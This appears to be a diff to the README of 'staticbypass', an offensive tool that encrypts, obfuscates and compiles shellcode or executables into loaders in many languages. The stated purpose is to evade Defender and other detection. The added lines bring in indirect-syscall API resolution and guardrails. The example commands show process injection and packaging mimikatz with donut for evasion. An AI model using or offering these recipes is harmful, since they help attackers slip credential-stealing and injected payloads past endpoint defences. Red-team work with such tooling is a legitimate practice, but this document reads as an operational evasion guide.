@@ -3,35 +3,42 @@
 ## Features
 - Takes in a raw shellcode or executable file, applies encryptors and obfuscators, formats it, places it into a template, and compiles it
 - Supports C, C#, PowerShell, VBA, Rust, Go, Pascal, and Nim
-- Supports Typescript using Bun and Javascript using Deno
+- Supports Typescript using Bun, Javascript using Deno, and Java using GraalVM
 - Automates placing VBA code into a word document
 - Supports AES, XOR, and RC4 encryption, and Dictionary, UUID, IPv4, IPv6, and MAC address obfuscation
-- Designed to bypass static detection methods
+- Designed to bypass static and possible dynamic detection methods
 
 ## Usage
 ```
-python3 staticbypass.py -h                                                                                
-usage: staticbypass.py [-h] [-e [TRANSFORMERS ...]] -s SHELLCODE -t TEMPLATE -l {rs,cs,vba,ps1,c} [-f OBFUSCATOR] [-b PREPROCESSORS] [-a POSTPROCESSORS] [-d DELIVERY] [-o OUTPUT]
+python3 staticbypass.py -h
+usage: staticbypass.py [-h] [-e [TRANSFORMERS ...]] -s SHELLCODE -t TEMPLATE -l {rs,vba,c,pas,nim,cs,ts,js,go,ps1,java} [-f OBFUSCATOR] [-g [GUARDRAILS ...]] [-r RESOLVER] [-b [PREPROCESSORS ...]] [-a [POSTPROCESSORS ...]] [-d DELIVERY] [-w WRAPPER] [-o OUTPUT]
 
 options:
   -h, --help            show this help message and exit
-  -e, --transformers [TRANSFORMERS ...]
+  -e [TRANSFORMERS ...], --transformers [TRANSFORMERS ...]
                         Transformers encrypt or encode the shellcode and is decrypted or decoded at runtime.
-  -s, --shellcode SHELLCODE
+  -s SHELLCODE, --shellcode SHELLCODE
                         Specifies the raw binary shellcode file
-  -t, --template TEMPLATE
+  -t TEMPLATE, --template TEMPLATE
                         Template that the shellcode and deobfuscation code will be placed into.
-  -l, --language {rs,cs,vba,ps1,c}
+  -l {rs,vba,c,pas,nim,cs,ts,js,go,ps1,java}, --language {rs,vba,c,pas,nim,cs,ts,js,go,ps1,java}
                         Language used to write and compile
-  -f, --obfuscator OBFUSCATOR
+  -f OBFUSCATOR, --obfuscator OBFUSCATOR
                         Obfuscators transform the transformed shellcode bytes into other formats, such as strings.
-  -b, --preprocessors PREPROCESSORS
+  -g [GUARDRAILS ...], --guardrails [GUARDRAILS ...]
+                        Guardrails stop execution if some condition is met.
+  -r RESOLVER, --resolver RESOLVER
+                        Controls how Windows API calls are resolved.
+  -b [PREPROCESSORS ...], --preprocessors [PREPROCESSORS ...]
                         Preprocessors modify the shellcode but are self decoding.
-  -a, --postprocessors POSTPROCESSORS
+  -a [POSTPROCESSORS ...], --postprocessors [POSTPROCESSORS ...]
                         Postprocessors obfuscate the resulting exe or script, e.g. packers
-  -d, --delivery DELIVERY
+  -d DELIVERY, --delivery DELIVERY
                         Delivery defines where the obfuscated shellcode is retrieved
-  -o, --output OUTPUT   Output file name
+  -w WRAPPER, --wrapper WRAPPER
+                        Wrap execution template in other code for obfuscation
+  -o OUTPUT, --output OUTPUT
+                        Output file name
 ```
 
 ## Examples
@@ -39,8 +46,11 @@ options:
 # Generic Defender Bypass
 python3 staticbypass.py --obfuscator DictObfuscate --transformers XOREncrypt RC4Encrypt AESEncrypt --shellcode ~/shellcode.bin --template shellcoderunner --language cs
 
+# Indirect Syscalls using TartarusGate to resolve windows API call
+python3 staticbypass.py --obfuscator DictObfuscate --transformers XOREncrypt RC4Encrypt AESEncrypt --shellcode ~/shellcode.bin --template spawnandinject,spawn=NtCreateUserProcess,allocation=NtAllocateVirtualMemory,write=NtWriteVirtualMemory,protect=NtProtectVirtualMemory,execution=NtQueueApcThread,close=NtClose --language c --resolver tartarusgatehash
+
 # Spawn a process and inject into it using VM-based obfuscation
-python3 staticbypass.py -s ~/shellcode.bin -b mkpivm64 -e IPv4Obfuscate -t spawnandinject -l c -a strip
+python3 staticbypass.py -s ~/shellcode.bin -b mkpivm64 -e IPv4Obfuscate -t spawnandinject,perm=rwx -l c -a strip
 
 # Donut an executable then AESEncrypt it and UUIDEncode it and compile it with rust
 python3 staticbypass.py -s mimikatz.exe -b donut -e AESEncrypt -t shellcoderunner -l rust
@@ -56,15 +66,17 @@ python3 staticbypass.py -s ~/shellcode.bin -b mkpivm64 -e IPv4Obfuscate -t shell
 - Add obfuscator support for the different programming languages
 - Add more templates e.g. early bird apc injection, heap allocation
 - Refactor code
-- Add arguments to templates and other categories
+- Add arguments to compiler
 - Add guardrails
 - Finish install script
+- Add better windows support
 
 ## Installation
 ### Install pre-reqs
 ```
-sudo apt install mono-devel mingw-w64 wine osslsigncode libz-mingw-w64-dev
+./install.sh
 ```
+Will get you most of the way there, still have yet to test it properly
 
 ### Download project
 ```
